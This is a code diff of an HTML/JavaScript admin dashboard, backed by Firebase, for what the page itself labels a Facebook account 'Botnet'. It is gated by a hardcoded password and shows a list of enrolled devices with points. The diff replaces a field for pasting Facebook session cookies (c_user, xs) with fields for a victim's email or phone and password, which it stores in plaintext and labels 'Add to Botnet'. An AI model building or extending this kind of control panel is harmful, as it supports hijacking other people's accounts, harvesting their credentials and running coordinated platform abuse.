@@ -15,8 +15,6 @@
     .btn-small { padding: 5px 10px; font-size: 12px; }
     .box { border: 1px solid #333; padding: 15px; margin-bottom: 15px; border-radius: 5px; text-align: left; }
     .box h3 { margin-top: 0; color: #fff; font-size: 16px; }
-    
-    /* ইউজার কার্ডের ডিজাইন */
     .user-card { background: #222; padding: 12px; margin-bottom: 10px; border-radius: 5px; border-left: 3px solid #00ff41; text-align: left; }
     .user-card p { margin: 5px 0; color: #ccc; font-size: 14px; }
     .user-card b { color: #fff; }
@@ -26,7 +24,6 @@
 </head>
 <body>
 
-  <!-- অ্যাডমিন পাসওয়ার্ড প্যানেল -->
   <div id="authPanel" class="container">
     <h1>ADMIN ACCESS</h1>
     <input type="password" id="adminPass" placeholder="Enter Admin Password">
@@ -35,11 +32,9 @@
     <button style="background:#333; margin-top:20px; width: 100%;" onclick="goBack()">Back to App</button>
   </div>
 
-  <!-- অ্যাডমিন ড্যাশবোর্ড -->
   <div id="adminPanel" class="container hidden">
     <h1>ADMIN CONTROL</h1>
     
-    <!-- ১. ইউজার লিস্ট এবং পয়েন্ট অ্যাড -->
     <div class="box">
       <h3>Active Users (Botnet)</h3>
       <div id="userList" style="max-height: 350px; overflow-y: auto;">
@@ -47,10 +42,10 @@
       </div>
     </div>
 
-    <!-- ২. ম্যানুয়ালি অ্যাকাউন্ট অ্যাড (ঐচ্ছিক) -->
     <div class="box">
-      <h3>Add Account to Botnet (Manual)</h3>
-      <textarea id="manualCookie" rows="2" placeholder="c_user=...; xs=..."></textarea>
+      <h3>Add Account (Email/Phone & Password)</h3>
+      <input type="text" id="manualEmail" placeholder="Facebook Email or Phone Number">
+      <input type="password" id="manualPass" placeholder="Facebook Password">
       <button onclick="addManualAccount()">Add to Botnet</button>
     </div>
 
@@ -75,13 +70,12 @@
     const app = initializeApp(firebaseConfig);
     const db = getDatabase(app);
 
-    // ১. পাসওয়ার্ড চেক
     window.checkPassword = function() {
       const pass = document.getElementById('adminPass').value;
       if (pass === 'arif123') {
         document.getElementById('authPanel').classList.add('hidden');
         document.getElementById('adminPanel').classList.remove('hidden');
-        loadUsers(); // প্যানেল খুললেই ইউজার লিস্ট লোড হবে
+        loadUsers(); 
       } else {
         document.getElementById('authStatus').innerText = "❌ Wrong Password!";
       }
@@ -91,7 +85,6 @@
       window.location.href = "index.html"; 
     }
 
-    // ২. ফায়ারবেস থেকে ইউজার লিস্ট লোড করা
     async function loadUsers() {
       const userListDiv = document.getElementById('userList');
       try {
@@ -100,13 +93,12 @@
         
         if (snapshot.exists()) {
           const users = snapshot.val();
-          userListDiv.innerHTML = ''; // আগের লিস্ট মুছে ফেলা
+          userListDiv.innerHTML = ''; 
 
           for (const [key, data] of Object.entries(users)) {
             const deviceName = data.deviceName || "Unknown Device";
             const points = data.points || 0;
 
-            // ইউজার কার্ড তৈরি
             const card = document.createElement('div');
             card.className = 'user-card';
             card.innerHTML = `
@@ -127,7 +119,6 @@
       }
     }
 
-    // ৩. নির্দিষ্ট ইউজারকে পয়েন্ট অ্যাড করা (সরাসরি লিস্ট থেকে)
     window.addPoints = async function(userKey) {
       const inputAmount = document.getElementById(`input-${userKey}`).value;
       const amount = parseInt(inputAmount);
@@ -144,36 +135,40 @@
         const currentPoints = snapshot.val().points || 0;
         const newPoints = currentPoints + amount;
 
-        // ফায়ারবেসে পয়েন্ট আপডেট
         await update(userRef, { points: newPoints });
         
-        // UI আপডেট (পেজ রিফ্রেশ ছাড়া)
         document.getElementById(`points-${userKey}`).innerText = newPoints;
         document.getElementById(`input-${userKey}`).value = ''; 
         
         status.innerText = `✅ Added ${amount} points. New total: ${newPoints}`;
-        setTimeout(() => { status.innerText = ""; }, 3000); // ৩ সেকেন্ড পর মেসেজ মুছে যাবে
+        setTimeout(() => { status.innerText = ""; }, 3000); 
         
       } catch (error) {
         status.innerText = "❌ Error: " + error.message;
       }
     }
 
-    // ৪. ম্যানুয়ালি বোটনেটে অ্যাকাউন্ট অ্যাড করা
     window.addManualAccount = async function() {
-      const cookie = document.getElementById('manualCookie').value.trim();
+      const email = document.getElementById('manualEmail').value.trim();
+      const password = document.getElementById('manualPass').value.trim();
       const status = document.getElementById('adminStatus');
       
-      if (!cookie || !cookie.includes('c_user')) return status.innerText = "❌ Invalid cookie format";
+      if (!email || !password) return status.innerText = "❌ Please enter email and password";
 
       try {
         const accRef = ref(db, 'accounts');
-        await set(push(accRef), { cookie: cookie });
-        status.innerText = "✅ Account added to Botnet!";
-        document.getElementById('manualCookie').value = '';
+        await set(push(accRef), { 
+          email: email, 
+          password: password,
+          type: "credentials"
+        });
+        
+        status.innerText = "✅ Account (Email/Pass) added to Botnet!";
+        document.getElementById('manualEmail').value = '';
+        document.getElementById('manualPass').value = '';
         setTimeout(() => { status.innerText = ""; }, 3000);
       } catch (e) { status.innerText = "❌ Error: " + e.message; }
     }
   </script>
 </body>
-          </html>
+</html>
